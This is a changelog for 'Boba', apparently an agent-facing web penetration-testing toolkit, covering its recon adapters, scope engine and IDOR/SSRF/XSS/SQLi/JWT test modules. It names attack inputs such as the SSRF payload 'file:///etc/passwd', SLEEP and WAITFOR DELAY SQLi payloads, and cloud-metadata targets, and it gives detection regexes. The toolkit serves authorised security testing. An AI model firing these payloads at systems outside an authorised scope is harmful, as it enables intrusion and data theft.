- **`tests/adapters/test_adapters.py`** (+5 tests) — WaybackurlsAdapter build_command, stdin target storage, parse_record, extract_scope_target
- **`tests/tools/test_scan.py`** (28 tests, new file) — nuclei_scan tool-layer composition, NucleiAdapter parse_record/build_command/extract_scope_target, severity/tags/template filters

---

## 0.2.11 — Scope YAML Null Fix & Test Coverage Expansion

**Date:** 2026-04-01
**Scope:** 5 files fixed, 8 new test files, 206 tests passing (90 new, 0 regressions)

Comprehensive 4-agent parallel codebase review followed by bug fixes and major test coverage expansion. Test count: 116 → 206.

### Bug Fixes

- **`from_yaml()` crashes on empty YAML** — `yaml.safe_load()` returns `None` for empty files; now validates result is a dict before calling `.get()`
- **OOB empty `listener_id` matches everything** — added `lid` truthiness guard so `startswith("")` can't match all interactions
- **OOB interaction deduplication** — `poll()` now deduplicates by `full_id` before appending, preventing duplicate interactions across multiple poll calls
- **Streaming subprocess `wait()` can hang forever** — added 5s timeout to `process.wait()` after kill in `run_subprocess_streaming()` finally block
- **SQLi error signatures case-sensitive** — lowercased all signatures; detection already uses `.lower()` on both sides, now consistent

### Test Coverage (90 new tests)

- **`tests/core/test_hunt.py`** (14 tests) — HuntManager CRUD, scope persistence, YAML loading, state transitions, terminal state enforcement, stats
- **`tests/core/test_subprocess.py`** (10 tests) — echo, exit codes, stderr, timeout, stdin, env vars, callbacks, streaming, duration tracking
- **`tests/adapters/test_base_adapter.py`** (20 tests) — parse_output for all 4 formats (JSONL, JSON_OBJECT, PLAIN_LINES, JSON_ARRAY), error counting, file-based output, temp file lifecycle
- **`tests/adapters/test_adapters.py`** (24 tests) — build_command and parse_record for all 8 adapters + Nuclei
- **`tests/tools/test_recon.py`** (7 tests) — subdomains, hosts, ports, urls (parallel merge), tech, tool run logging
- **`tests/tools/test_enum.py`** (6 tests) — directories, crawl, empty targets, tool run logging
- **`tests/cli/test_cli.py`** (9 tests) — hunt create/list/status/pause/close, JSON format, invalid format error, context stats

---

## 0.2.10 — Finding Staleness, Hunt State Validation & Timeouts

**Date:** 2026-04-01
**Scope:** 8 files modified, 116 tests passing (0 regressions)
**Details:** [v1v2-v3-readiness-final-gate.md](completions/v1v2-v3-readiness-final-gate.md)

5-agent parallel codebase review across all layers. Found 10 medium-severity issues surviving all prior hardening rounds (0.2.1–0.2.9). All fixes are strictly additive. Score: 7.5/10 → 8.5+/10.

### Correctness

- **`upsert_finding` ON CONFLICT now updates `false_positive` and `reported` flags** — re-scans no longer leave stale flags from the original insert
- **Hunt state transition validation** — `completed` is now a terminal state; invalid transitions (e.g., resume a completed hunt) raise `ValueError` with allowed transitions listed
- **`log_tool_run` computes accurate `started_at`** — `finished_at - duration_seconds` instead of recording current time for both fields
- **MSSQL time-based SQLi payload fixed** — replaced MySQL `SLEEP()` syntax with MSSQL `WAITFOR DELAY` in the second MSSQL payload
- **IDOR body comparison added to primary detection path** — when unauth is denied but both users get 2xx, bodies are now compared; similar → CONFIRMED, different → LIKELY (prevents FP on shared endpoints like `/api/me`)

### Robustness

- **OOB `poll()` uses wall-clock timeout** — `time.monotonic()` deadline replaces additive `elapsed += poll_interval` that drifted with network I/O time
- **`navigate()` accepts caller-controllable timeout** — new `timeout_ms` parameter (default 30s) passed to Playwright's `page.goto()`
- **`login_form` post-submit wait has 30s timeout** — `wait_for_load_state("networkidle")` no longer hangs indefinitely on long-polling pages

### Validation & Safety

- **`from_yaml` validates scope rule dicts** — missing `pattern`/`type` keys now raise `ValueError` with rule index and content, instead of raw `KeyError`
- **CLI `_safe_close_http` uses explicit event loop lifecycle** — `asyncio.new_event_loop()` with proper `try/finally/close()` instead of fragile `asyncio.run()` after prior loop closure

---

## 0.2.9 — HttpClient Connection Leak & JWT Padding Fix

**Date:** 2026-04-01
**Scope:** 9 files modified, 116 tests passing (0 regressions)

5-agent parallel codebase review across all layers. Found 2 critical, 4 high, and 1 medium issue surviving all prior hardening rounds. 8 review findings verified as false alarms and not fixed. Score: 7.5/10 → 8.5+/10.

### Critical

- **HttpClient connection pool never closed in CLI** — 8 CLI commands created `HttpClient(sink)` but never called `close()`, leaking httpx TCP connections and file descriptors on every invocation. Added `_safe_close_http()` helper with cleanup in all 8 finally blocks.
- **JWT base64 padding adds 4 extra bytes** — `(4 - len(s) % 4)` produces 4 when length is already a multiple of 4. Fixed to `(4 - len(s) % 4) % 4`.

### High

- **`recon.tech()` crashes on null technologies** — `record.get("technologies", [])` doesn't handle present-but-None values; changed to `record.get("technologies") or []`
- **WhatwebAdapter crashes on non-dict plugins** — `raw.get("plugins", {}).items()` fails if plugins is a string/list/null; added `isinstance(plugins, dict)` guard
- **`_bodies_similar()` boundary excludes threshold** — `len_ratio <= threshold` excluded the exact boundary value (0.8); changed to `< threshold` for inclusive comparison
- **Naabu/Katana command args not converted to string** — `extra_args_dict` values passed directly to subprocess could be integers; wrapped in `str()`

### Medium

- **XSS `ALL` missing DOM canary payloads** — `DOM_CANARY` payloads excluded from `ALL` list; tests using default payloads now include DOM-based detection

---

## 0.2.8 — Scope URL Bypass, HttpClient Resilience & SQLi Timing

**Date:** 2026-04-01
**Scope:** 7 files modified, 116 tests passing (0 regressions)

4-agent parallel codebase review targeting 8.5/10 quality across all layers. Uncovered 3 critical, 6 high, and 3 medium issues spanning scope enforcement, network resilience, detection accuracy, and CLI validation. Score: 7.0/10 → 8.5/10.

### Critical

- **Scope URL prefix bypass for scheme-less URLs fixed** — targets without a scheme (e.g. `app.example.com/admin`) were passed unnormalized to `_check_url_prefix()`, causing URL prefix exclusion rules to silently miss. Now normalizes to `https://` before prefix matching.
- **`hunt_list` missing `except` clause fixed** — command had `try/finally` but no `except`, causing raw Python tracebacks instead of user-friendly error messages
- **OOB fallback client async methods added** — `_FallbackOOBClient` lacked `register()`/`deregister()` methods, causing `AttributeError` when Interactsh is not installed and `stop()` calls `deregister()`

### High

- **HttpClient network error resilience** — `httpx.RequestError` exceptions (timeout, connection refused, DNS failure) now caught and recorded in HTTP history with `status_code=0` and `network_error` tag instead of crashing mid-scan
- **Time-based SQLi uses multiple baselines** — single baseline measurement replaced with 3 samples using median; reduces false positives from network jitter and false negatives from high-variance servers
- **`recon.tech()` record mutation fixed** — `t["host"] = host` mutated original `ToolResult` records in-place; replaced with `{**t, "host": host}` copy
- **Subprocess `await` after kill on deadline** — `run_subprocess_streaming()` now calls `await process.wait()` after `process.kill()` on deadline exceeded, preventing zombie processes
- **OOB listener ID extraction validated** — `callback_domain.split(".")[0]` now guarded against missing dots and empty IDs with `OOBError` exceptions
- **Empty target validation in recon tools** — `recon.subdomains()` and `recon.urls()` return empty results immediately when given empty domain lists instead of running tools with no arguments

### Medium

- **XSS partial reflection tightened** — inner content match now requires JS-specific patterns (`on\w+=`, `javascript:`, `alert(`, etc.) in addition to 16-char minimum, reducing false positives from common strings reflected in error pages
- **SSRF indicators context-aware** — plain substring checks (`"ami-"`, `"root:"`) replaced with regex patterns requiring structural context (`ami-[0-9a-f]{5,}`, `root:[^:]*:\d+:\d+:`, `instance-id\b`, `computeMetadata/`), eliminating false positives from product names
- **CLI header validation** — `--header` values without colons now raise an error with guidance (`expected KEY:VALUE`) instead of being silently dropped; `--method` on session create validates against `AuthMethod` enum with valid options listed on error

---

## 0.2.7 — _safe_close Recursion, OOB Performance & Cluster Bomb Cap

**Date:** 2026-03-31
**Scope:** 14 files modified, 116 tests passing (0 regressions)
**Details:** [v1v2-pre-v3-final-gate.md](completions/v1v2-pre-v3-final-gate.md)

5-agent parallel codebase review uncovered 1 critical bug, 7 high-priority issues, and 7 medium-priority fixes surviving all prior hardening rounds. Score: 6.5/10 → 8.5/10.

- **`_safe_close()` infinite recursion fixed** — helper called itself instead of `manager.close_context()`, leaking SQLite connections on every CLI invocation
- **`SystemExit(1)` → `typer.Exit(code=1)`** — invalid `--format` no longer bypasses Typer's `finally` blocks
- **SSRF false positives eliminated** — removed generic "internal server error" from confirmed indicators; evidence collection no longer halted by early false match; break after confirmed
- **XSS decoded reflection check** — URL-encoded payloads now also checked in decoded form; partial reflection threshold tightened (8→16 chars)
- **OOB poll O(n*m) → O(n+m)** — listeners fetched once before interaction loop, not per-interaction
- **SessionState `get()` returns deepcopy** — callers can no longer accidentally mutate cached session state
- **Cluster bomb capped at 100K combinations** — prevents accidental OOM from Cartesian product explosion
- **CSS selector injection fixed** — field names escaped in `fill_form()` and `login_form()` before CSS interpolation
- **Scope CIDR classification fixed** — `10.0.0.0/24` no longer misclassified as URL
- **`enum.py` config mutation prevented** — caller-provided configs are deepcopied before mutation
- **SSRF `PROTOCOL_SMUGGLE` added to `ALL`** — `file:///etc/passwd` now tested by default
- **SQLi MSSQL payload removed from MySQL list** — eliminates duplicate request
- **Body file path traversal validation** — `get_full_body()` validates path is within body directory
- **Browser `stop()` exception-safe** — browser/playwright close failures no longer prevent each other
- **Dead hash comparison removed** from `_bodies_similar`

---

## 0.2.6 — Per-Request Timeout, Time-Based SQLi & JWT Hardening

**Date:** 2026-03-31
**Scope:** 14 files modified, 116 tests passing (1 new, 0 regressions)
**Details:** [v1v2-final-review.md](completions/v1v2-final-review.md)

Comprehensive 5-agent parallel codebase review for V3-readiness. Fixed 7 correctness bugs, 7 robustness issues, and 2 code quality fixes that survived all prior hardening rounds.

- **Per-request timeout now works in HttpClient** — `timeout_seconds` parameter was accepted but never passed to httpx; also removed misleading unused `verify_ssl`/`proxy` params from `request()`
- **Time-based SQL injection detection implemented** — completes the 4-method SQLi detection documented in the docstring; uses SLEEP payloads with 3s delay threshold over baseline
- **XSS partial reflection now flags as vulnerable** — inner payload content reflected without tags is reported with POSSIBLE confidence instead of silently discarded
- **JWT exception handler narrowed** — `except (ValueError, Exception)` replaced with specific `(ValueError, KeyError, IndexError)` to stop masking real errors
- **IDOR object enumeration always runs** — no longer gated on prior `vulnerable=True`; provided test IDs are always tested and can upgrade confidence
- **SQLi boolean threshold includes boundary** — `> 20` → `>= 20` bytes; `> 0.05` → `>= 0.05` relative
- **Scope post-filter handles empty-string targets** — `""` targets no longer bypass scope checking via Python truthiness
- **`create_hunt()` is now transactional** — hunt + scope_rules wrapped in `with self._conn:`; prevents partial state
- **OOB poll loop logs exceptions** — `except Exception: pass` replaced with debug logging
- **Browser `fill_form` has timeout** — `wait_for_load_state("networkidle")` no longer hangs indefinitely
- **CLI finally blocks can't mask exceptions** — 41 locations now use `_safe_close()` helper
- **Invalid `--format` exits with error** — no longer silently falls back to table output
- **HttpHistorySink gracefully handles file I/O errors** — falls back to truncated inline storage
- **DOM XSS evidence includes URL** — adds traceability for browser-based detection
- **Dead code removed** from `get_hunt_stats()`
- **Duplicate XSS payload removed** from polyglots list

---

## 0.2.5 — Subprocess Exit Codes, Scope URL Bypass & Adapter Logging

**Date:** 2026-03-31
**Scope:** 8 files modified, 115 tests passing (0 regressions)
**Details:** [v1v2-pre-v3-quality-gate.md](completions/v1v2-pre-v3-quality-gate.md)

Final quality gate before V3 development. 4-agent parallel codebase review uncovered 2 critical bugs and 6 correctness/robustness issues that survived prior hardening rounds.

- **Subprocess exit code 0 no longer misreported as -1** — `process.returncode or -1` treated success (0) as falsy; now uses explicit `is not None` check
- **Scope URL prefix bypass eliminated** — bare `"*"` pattern produced empty prefix that matched every URL via `startswith("")`; empty prefixes now skipped
- **OOB fallback logs warning** — silent `ImportError` catch no longer masks disabled blind vulnerability detection
- **Httpx port 0 correctly parsed** — truthiness check replaced with `is not None`
- **Ffuf warns on multiple targets** — no longer silently drops targets beyond the first
- **Base adapter logs non-zero exit codes** — tool failures no longer silently return empty results
- **Browser interception timing corrected** — replaced unreliable Playwright timing value with explicit 0
- **HTTP compare() handles bytes bodies** — defensive normalization prevents wrong diffs

---

## 0.2.4 — Operational Robustness

**Date:** 2026-03-31
**Scope:** 6 files modified, 1 test file updated, 115 tests passing (0 regressions)
**Details:** [v1v2-operational-robustness.md](completions/v1v2-operational-robustness.md)

Final quality gate before V3 development. Addresses runtime reliability and debuggability issues found during a comprehensive 5-agent codebase audit.

- **Response body_text no longer truncated** — removed silent 8KB cap that caused vuln detection tools to miss evidence in longer responses
- **Persistent HttpClient** — connection pool reused across requests instead of create/destroy per call; `async with` lifecycle support
- **Diagnostic logging in 20+ catch blocks** — all JSON decode failures in context.py, parse errors in base adapter, and browser interception errors now emit warnings/debug logs with entity IDs and exception details
- **SQL table name validation** — `get_hunt_stats()` uses immutable `frozenset` allowlist instead of inline list
- **Browser shutdown ordering** — pages closed before their parent contexts to prevent race conditions in async handlers
- **SQLi baseline includes test parameter** — boolean-based detection now compares against structurally identical baseline request

---

## 0.2.3 — Data Integrity & Resource Safety

**Date:** 2026-03-31
**Scope:** 8 files modified, 115 tests passing (0 regressions)
**Details:** [v1v2-pre-v3-fixes.md](completions/v1v2-pre-v3-fixes.md)

Pre-V3 pass targeting transaction safety, exception handling completeness, and resource lifecycle.

- **Technology records committed to database** — `upsert_technology` added to `upsert_records()` dispatch table; `recon.tech()` rewritten to use batch path
- **Broader parse_record() exception handling** — JSON_LINES, JSON_OBJECT, JSON_ARRAY handlers now catch `Exception` (matching PLAIN_LINES), preventing one bad record from crashing the entire run
- **HuntContext context manager** — `__enter__`/`__exit__` for automatic SQLite cleanup
- **37 lint errors resolved** — unused imports and variable assignments across 15 files
- **HTTP body file naming** — UUID-based (collision-free) instead of glob-counter (race-prone)
- **Browser context cleanup on setup failure** — context registered only after page+interception succeed
- **`asyncio.gather()` partial results** — `recon.urls()` uses `return_exceptions=True` so one adapter failure doesn't discard the other's results

---

## 0.2.2 — Detection Correctness & Defensive Robustness

**Date:** 2026-03-31
**Scope:** 10 files modified, 115 tests passing (0 regressions)
**Details:** [v1v2-hardening.md](completions/v1v2-hardening.md)

Second quality pass targeting detection accuracy in the 5 vuln tools and defensive robustness in adapter/interaction/persistence layers.

- **IDOR URL path manipulation** — `urlparse`/`urlunparse` instead of naive `str.replace()` that corrupted URLs with trailing slashes or duplicate segments
- **SSRF indicator list unconditional** — `"internal server error"` checked for all SSRF vectors, not just localhost
- **Auth endpoint regex** — path-boundary matching (`/admin/`, `/admin?`) instead of substring (`/gadmin`, `/administrator`)
- **XSS partial reflection** — extracts inner content between tags with 8-char minimum, reducing false positives
- **Version sync** — `__version__` updated to 0.2.0 to match pyproject.toml
- **JSON decode safety in V2 methods** — `get_session()`, `get_sessions()`, `get_findings()`, `get_oob_listeners()` wrapped with try/except
- **Subprocess stdin cleanup** — try/finally ensures pipe closed even on drain failure
- **Subprocess truncation signal** — `output_truncated` field on `SubprocessResult`
- **PLAIN_LINES error handling** — matches JSON format handlers' try/except pattern
- **Session login_form validation** — raises `SessionError` if no selectors match instead of returning silently
- **OOB listener matching** — `startswith` instead of substring `in` check
- **CLI hardening** — required URL param, comma whitespace stripping, help text, format validation

---

## 0.2.1 — Code Quality & Correctness

**Date:** 2026-03-31
**Scope:** 12 files modified, 115 tests passing (0 regressions)
**Details:** [v1v2-refinements.md](completions/v1v2-refinements.md)

First quality pass addressing correctness, safety, and robustness issues across the V1/V2 codebase.

- **IPv6 scope handling** — new `_strip_port()` method correctly handles bracketed IPv6, bare IPv6, and IPv4 with ports
- **URL encoding for vuln payloads** — new `_inject_param()` helper uses `urlparse`/`urlencode` instead of raw string concatenation across all 9 injection points
- **WaybackurlsAdapter initialization** — `_stdin_targets` initialized in `__init__` to prevent `AttributeError`
- **Parse error tracking** — `parse_output()` returns `(records, parse_errors)` tuple; `parse_errors` field on `ToolResult`
- **Async context managers** — `BrowserManager` and `OOBManager` support `async with`
- **Temp file safety** — `mktemp()` replaced with `NamedTemporaryFile` in whatweb and ffuf adapters
- **JSON decode safety** — `_row_to_hunt()`, `get_http_record()`, `query_http_history()` wrapped with try/except
- **Scope rule validation** — malformed patterns caught at compile time instead of match time
- **IDOR similarity check** — three-stage comparison (exact → SHA-256 → structural line overlap) instead of length-only
- **SQLi boolean threshold** — dual threshold (absolute 20 bytes OR relative 5%) instead of fixed 50 bytes
- **Output size bounding** — 256MB cap on subprocess stdout accumulation

---

## 0.2.0 — Interaction: Browser, HTTP & Vulnerability Testing

**Date:** 2026-03-31
**Scope:** 20 new files, ~3,200 lines of new code, 115 tests passing (86 new)

V2 gives agents the ability to interact with web applications and test for vulnerabilities — replacing what a human does with Burp Suite + a browser.

### Interaction Layer (`interaction/`)

- **HttpHistorySink** — single write path for all HTTP exchanges. Large bodies (>64KB) stored as files with inline preview. Query by host, method, status, source, session.
- **HttpClient** — Burp Repeater/Intruder equivalent. `request()`, `replay()`, `compare()`, `fuzz()` with all 4 attack types (sniper, battering_ram, pitchfork, cluster_bomb).
- **SessionManager** — named auth sessions with bearer, basic, cookie, header, and form login. Sessions are serializable data, applicable to both browser and HTTP client.
- **BrowserManager** — Playwright-based. Navigate, screenshot, extract DOM, execute JS, fill forms. Traffic intercepted in real-time via `page.on("response")`.
- **OOBManager** — Interactsh integration for blind vulnerability detection. Fallback client when Interactsh unavailable.

### Vulnerability Testing (`tools/vuln.py`)

- `test_idor()` — compare responses across 3 auth levels (owner, attacker, no-auth)
- `test_ssrf()` — response content analysis + OOB callback detection
- `test_xss()` — reflected payload detection + DOM-based via browser
- `test_sqli()` — error signatures + boolean-based response diff
- `test_auth()` — no-auth access + JWT none algorithm + claim escalation

### New Adapter

- **Nuclei** (`adapters/nuclei.py`) — template-based vulnerability scanning. Results persisted to findings table. Supports severity/tags/template filters.

### Built-in Payloads (`payloads/`)

- XSS: polyglots, event handlers, encoding bypasses, blind callbacks
- SQLi: error-based, boolean-based, time-based (MySQL/PG/MSSQL/SQLite)
- SSRF: localhost variants, cloud metadata (AWS/GCP/Azure), internal ranges
- Auth: JWT manipulation helpers, escalation claims

### Schema Extensions

4 new tables: `http_history`, `sessions`, `findings`, `oob_listeners`. 16 new context methods.

### CLI

5 new command groups (browser, http, session, scan, test) + 4 context extensions (http-history, findings, sessions, oob). Total: 9 command groups, 36 commands.

---

## 0.1.0 — Foundation: Recon & Enumeration

**Date:** 2026-03-31
**Scope:** 33 files, ~3,000 lines, 29 tests passing

The initial release establishes Boba's core architecture and delivers a complete recon/enumeration toolkit that agents can use to discover and map attack surfaces.

### Core Framework

- **Scope engine** (`core/scope.py`) — default-deny model with domain wildcards (`*.example.com`), IP/CIDR ranges, and URL prefix matching. Exclusions always win. Per-adapter scope modes (pre, post, both) enforce boundaries at the right point in each tool's lifecycle.
- **Hunt context** (`core/context.py`) — SQLite-backed persistence (WAL mode, foreign keys) with 8 tables. Upserts deduplicate records and merge sources via `json_each()` + `json_group_array()` — no read-modify-write cycles.
- **Hunt management** (`core/hunt.py`) — create, pause, resume, close hunts with 12-char hex IDs. Stats query across all tables.
- **Async subprocess** (`core/subprocess.py`) — line-by-line stdout reading (memory-bounded), timeout with SIGKILL, optional stdin piping, streaming async generator variant.
- **Error hierarchy** — `BobaError` base with `ToolNotFoundError`, `ToolTimeoutError`, `ToolExecutionError`, `ScopeViolationError`, `HuntNotFoundError`.
- **Data models** (`core/models.py`) — dataclass-based: `Hunt`, `ScopeRule`, `ScopeConfig`, `AdapterConfig`, `ToolResult`, `SubprocessResult`, plus enums for status, scope actions, output formats.

### Adapters (8 tools)

Base adapter with 6-phase lifecycle: `find_binary() → pre_filter_targets() → build_command() → run_subprocess() → parse_output() → post_filter_records()`. Binary discovery searches PATH, `~/go/bin/`, `~/.local/bin/`.

| Adapter | Tool | Produces | Output Format |
|---|---|---|---|
| `subfinder.py` | subfinder | subdomains | JSON lines |
| `httpx_runner.py` | httpx | hosts | JSON lines |
| `naabu.py` | naabu | ports | JSON lines |
| `gau.py` | gau | urls | plain lines |
| `waybackurls.py` | waybackurls | urls | plain lines (stdin-piped) |
| `whatweb.py` | whatweb | technologies | JSON array (output file) |
| `katana.py` | katana | urls | JSON lines |
| `ffuf.py` | ffuf | directories | JSON object (output file) |

### High-Level Tools

- **`tools/recon.py`** — `subdomains()`, `hosts()`, `ports()`, `urls()`, `tech()`. Context-aware defaults: when no targets given, tools pull from previously discovered data. `urls()` runs gau + waybackurls in parallel via `asyncio.gather()`.
- **`tools/enum.py`** — `directories()` (ffuf), `crawl()` (katana). Auto-pulls alive hosts from context when no targets specified.

### CLI

Typer app with 4 command groups and `--format json|table` output:

```
boba hunt    {create, list, status, pause, resume, close}
boba recon   {subdomains, hosts, ports, urls, tech}
boba enum    {directories}
boba context {subdomains, hosts, ports, urls, tech, directories, runs, stats}
```
